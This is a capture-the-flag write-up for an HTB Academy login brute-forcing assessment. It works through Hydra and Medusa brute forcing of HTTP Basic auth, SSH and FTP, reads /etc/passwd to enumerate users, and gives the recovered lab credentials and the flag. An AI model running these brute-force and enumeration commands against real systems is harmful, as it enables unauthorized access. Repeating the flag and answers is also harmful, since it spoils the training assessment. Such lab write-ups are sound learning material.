# HTB Academy — CWES Login Brute Forcing Skills Assessment

**Flag:** `HTB{brut3f0rc1ng_succ3ssful}`  
**Attack Chain:** Basic HTTP Auth brute force → SSH brute force → internal user enumeration → FTP brute force → flag retrieval

---

## Session Notes

```
Part 1 target:   154.57.164.66:32732
Part 2 target:   154.57.164.69:31374 (SSH port)

Auth type P1:    Basic HTTP Authentication
SSH user:        satwossh
SSH password:    password1
FTP user:        thomas (found via /etc/passwd, home: /var/.hidden)
FTP password:    chocolate!
Flag location:   /home/satwossh/flag.txt (retrieved via FTP)
Wordlists:       top-usernames-shortlist.txt + 2023-200_most_used_passwords.txt
```

---

## Part 1 — Basic HTTP Auth Brute Force

### 1. Recon

```bash
curl -s -I http://154.57.164.66:32732/
```

Response:
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted"
```

`401` + `WWW-Authenticate: Basic` → confirmed Basic HTTP Authentication. Username unknown — need to brute force both fields.

### 2. Brute Force with Hydra

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  154.57.164.66 http-get / -s 32732
```

Result: `admin:Admin123`

### 3. Retrieve Username for Part 2

```bash
curl -s -u admin:Admin123 http://154.57.164.66:32732/
```

Response revealed username for Part 2: **`satwossh`**

---

## Part 2 — SSH → FTP Pivot

### 1. Recon

```bash
curl -s -I http://154.57.164.69:31374/   # no HTTP response
nc -zv 154.57.164.69 31374               # port open → SSH
```

Port open but no HTTP → SSH service. Username `satwossh` provided from Part 1.

### 2. SSH Brute Force with Medusa

```bash
medusa -h 154.57.164.69 -n 31374 -u satwossh \
  -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  -M ssh -t 3
```

Result: `satwossh:password1`

### 3. SSH Access + Internal Enumeration

```bash
ssh satwossh@154.57.164.69 -p 31374
```

Inside the session:
```bash
netstat -tulpn | grep LISTEN
```

Output showed port 21 (FTP) listening internally.

```bash
ls /home
# → satwossh only — no ftpuser folder
```

No FTP username hint from `/home`. Enumerated all shell users instead:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

Output:
```
root:x:0:0:root:/root:/bin/bash
satwossh:x:1000:1000::/home/satwossh:/bin/bash
thomas:x:1001:1001::/var/.hidden:/bin/bash
```

FTP username: **`thomas`** — home directory hidden at `/var/.hidden`, not in `/home`.

Also found `passwords.txt` already on the box in `satwossh`'s home directory — used that directly.

### 4. FTP Brute Force with Medusa

```bash
medusa -h 127.0.0.1 -u thomas -P passwords.txt -M ftp -t 5
```

Result: `thomas:chocolate!`

### 5. FTP Access + Flag Retrieval

```bash
ftp 'ftp://thomas:chocolate!@127.0.0.1'
```

Note: `chocolate!` contains `!` which triggers bash history expansion — must wrap URL in single quotes.

Inside FTP:
```
ls
get flag.txt
exit
```

```bash
cat flag.txt
# → HTB{brut3f0rc1ng_succ3ssful}
```

---

## Key Lessons

### /home is not the only place to find usernames
`ls /home` only showed `satwossh` — no FTP username visible. `cat /etc/passwd | grep -v nologin | grep -v false` revealed `thomas` with home at `/var/.hidden`. Always enumerate `/etc/passwd` after SSH access, not just `/home`.

### Check what's already on the box before downloading
`passwords.txt` was already present in the SSH user's home directory — the same wordlist the module hinted at. Always `ls` after SSH access before downloading anything.

### Special chars in passwords require single quotes
`chocolate!` — the `!` triggers bash history expansion in double quotes or unquoted strings. Wrap FTP URLs and curl data in single quotes: `ftp 'ftp://user:pass!@host'`

### Two-part assessment chain
Part 1 credentials unlock Part 2 — the page content after Basic Auth login contained the SSH username. Always read the full authenticated response, not just the status code.

### nc for service fingerprinting
When `curl -I` returns nothing, use `nc -zv host port` to confirm the port is open, then try SSH. A silent HTTP response + open port = likely non-HTTP service.
